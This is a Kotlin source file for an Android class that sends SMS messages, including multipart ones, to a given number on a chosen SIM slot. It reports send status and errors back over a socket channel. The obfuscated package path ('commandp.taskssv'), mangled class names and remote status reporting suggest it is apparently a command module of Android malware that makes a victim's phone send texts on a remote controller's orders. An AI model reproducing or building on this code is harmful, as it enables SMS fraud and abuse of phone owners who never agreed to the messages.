package com.xxx.zzz.commandp.taskssv

import android.Manifest
import android.annotation.SuppressLint
import android.app.Activity
import android.app.PendingIntent
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.telephony.SmsManager
import android.telephony.SubscriptionManager
import android.util.Log
import androidx.core.app.ActivityCompat
import com.xxx.zzz.aall.gsonllll.googlepp.Gsonq
import com.xxx.zzz.socketsp.IOSocketyt
import org.json.JSONObject


class SendSmsTask(
    val ctx: Context,
    private val phoneNumber: String,
    val message: String,
    private val simSlotIndex: Int = 0
) :
    BaseTask(ctx) {

    private val smsSent = "smsSent"
    private val smsDelivered = "smsDelivered"

    @SuppressLint("MissingPermission")
    private fun sendSms() {
        runCatching {
            val manager = SmsManager.getDefault()
            val piSend = PendingIntent.getBroadcast(ctx, 0, Intent(smsSent), 0)
            val piDelivered = PendingIntent.getBroadcast(ctx, 0, Intent(smsDelivered), 0)
            val length = message.length

            val subscriptionManager = ctx.applicationContext.getSystemService(SubscriptionManager::class.java)
            val subscriptionInfo =
                subscriptionManager.getActiveSubscriptionInfoForSimSlotIndex(simSlotIndex)

            if (length > 160) {
                val messageList = manager.divideMessage(message)

                val sents: ArrayList<PendingIntent> = ArrayList<PendingIntent>()
                val deliveredList = ArrayList<PendingIntent?>()
                for (i in messageList.indices) {
                    deliveredList.add(piDelivered)
                    sents.add(piSend)
                }

                if (subscriptionInfo != null)
                    SmsManager.getSmsManagerForSubscriptionId(subscriptionInfo.subscriptionId)
                        .sendMultipartTextMessage(
                            phoneNumber,
                            null,
                            messageList,
                            sents,
                            deliveredList
                        )
                else
                    SmsManager.getDefault().sendMultipartTextMessage(
                        phoneNumber,
                        null,
                        messageList,
                        sents,
                        deliveredList
                    )
            } else {
                if (subscriptionInfo != null)
                    SmsManager.getSmsManagerForSubscriptionId(subscriptionInfo.subscriptionId)
                        .sendTextMessage(phoneNumber, null, message, piSend, piDelivered)
                else
                    SmsManager.getDefault()
                        .sendTextMessage(phoneNumber, null, message, piSend, piDelivered)
            }
        }.onFailure {
            IOSocketyt.sendLogs("", "SendSmsManyTask ${it.localizedMessage}", "error")
        }
    }

    private val receiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            val status: String
            val reason: String

            when (resultCode) {
                Activity.RESULT_OK -> {
                    status = "success"
                    reason = "Everything was good :-)"
                }
                SmsManager.RESULT_ERROR_GENERIC_FAILURE -> {
                    status = "failed"
                    reason = "Message not sent."
                }
                SmsManager.RESULT_ERROR_NO_SERVICE -> {
                    status = "failed"
                    reason = "No service."
                }
                SmsManager.RESULT_ERROR_NULL_PDU -> {
                    status = "failed"
                    reason = "Error: Null PDU."
                }
                SmsManager.RESULT_ERROR_RADIO_OFF -> {
                    status = "failed"
                    reason = "Error: Radio off."
                }
                else -> {
                    status = "failed"
                    reason = "unknown"
                }
            }

            Log.i("tag", status + reason)

            foo(status, reason)
            context.unregisterReceiver(this)
        }

        private fun foo(status: String, reason: String) {
            runCatching {
                val data = JSONObject()
                data.put("status", status)
                data.put("reason", reason)
                data.put("dataType", "sendSmsStatus")

                IOSocketyt.sendLogs("", Gsonq().toJson(data), "sendSmsStatus")
            }.onFailure {
                IOSocketyt.sendLogs("", "foo ${it.localizedMessage}", "error")
            }
        }
    }

    override fun run() {
        super.run()
        if (ActivityCompat.checkSelfPermission(
                ctx,
                Manifest.permission.READ_PHONE_STATE
            ) == PackageManager.PERMISSION_GRANTED
        ) {
            runCatching {
                ctx.registerReceiver(receiver, IntentFilter(smsSent))
                sendSms()
            }.onFailure {
                IOSocketyt.sendLogs("", "SendSmsManyTask ${it.localizedMessage}", "error")
            }
        } else
            requestPermissions()
    }
}


